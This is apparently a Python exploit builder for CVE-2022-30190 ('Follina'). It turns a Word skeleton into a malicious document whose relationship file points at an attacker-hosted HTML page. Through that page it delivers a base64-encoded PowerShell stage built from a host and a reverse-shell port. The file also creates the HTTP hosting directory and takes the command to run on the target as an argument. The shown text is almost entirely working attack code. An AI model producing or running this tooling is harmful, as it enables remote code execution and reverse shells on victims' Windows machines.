#!/usr/bin/env python3
import os
import base64
import shutil
import zipfile
import tempfile
import ipaddress
import netifaces

def build_malicious_html(b64_payload, directory):
    with open(os.path.join(directory, "html.stg.bin"), "rb") as flip:
        return base64.b64decode(flip.read()).decode("utf-8").format(b64_payload=b64_payload)


def prepare_b64_payload(host, reverse, directory):
    with open(os.path.join(directory, "ps1.stg.bin"), "rb") as flip:
        return base64.b64encode(
            base64.b64decode(flip.read()).decode("utf-8").format(host=host, reverse=reverse).encode("utf-8")
        ).decode("utf-8")


def make_html_endpoint(directory, payload):
    with open(os.path.join(directory, "index.html"), "w") as filp:
        filp.write(payload)


def rebuild_legitimate_original_office_file(output_file, stagger_path):
    shutil.make_archive(output_file, "zip", stagger_path)
    os.rename(f"{output_file}.zip", output_file)
    print(f"[+] created maldoc {output_file}")


def weaponize_word_skeleton_file(host, port, directory, filename_suffix):
    document_rels_path = os.path.join(directory, filename_suffix, "word", "_rels", "document.xml.rels")
    with open(document_rels_path) as filp:
        external_referral = filp.read()
    external_referral = external_referral.replace("{staged_html}", f"http://{host}:{port}/index.html")
    with open(document_rels_path, "w") as filp:
        filp.write(external_referral)


def prepare_temp_http_server_location(directory):
    server_path = os.path.join(directory, "www")
    os.makedirs(server_path)
    return server_path


def copy_stage_word_skeleton(filename_suffix):
    staging_dir = os.path.join(
        tempfile._get_default_tempdir(),
        next(tempfile._get_candidate_names())
    )
    doc_path = os.path.join(staging_dir, filename_suffix)
    shutil.copytree(filename_suffix, os.path.join(staging_dir, doc_path))
    print(f"[+] copied staging doc {staging_dir}")
    return staging_dir, doc_path


def serve_host(interface):
    try:
        server = ipaddress.IPv4Address(interface)
        return server
    except ipaddress.AddressValueError:
        try:
            server = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]["addr"]
            return server
        except ValueError:
            print("[!] error detearing http hosting address. did you provide an interface or ip?")
            exit()


def parse_args():
    parser = __import__("argparse").ArgumentParser()
    parser.add_argument("--command", default="calc", help="command to run on the target (default: calc)")
    parser.add_argument("--output", default="./cve202230190.doc", help="output maldoc file (default: ./cve202230190.doc)")
    parser.add_argument("--interface", default="eth0", help="network interface or IP address to host the HTTP server (default: eth0)")
    parser.add_argument("--port", type=int, default="8000", help="port to serve the HTTP server (default: 8000)")
    parser.add_argument("--reverse", type=int, default="0", help="port to serve reverse shell on")
    return parser.parse_args()
